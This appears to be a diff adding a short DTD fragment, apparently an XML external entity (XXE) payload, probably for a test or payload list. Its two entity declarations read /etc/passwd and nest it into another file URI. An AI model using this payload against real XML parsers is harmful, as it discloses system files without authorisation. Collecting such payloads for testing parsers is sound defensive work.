@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
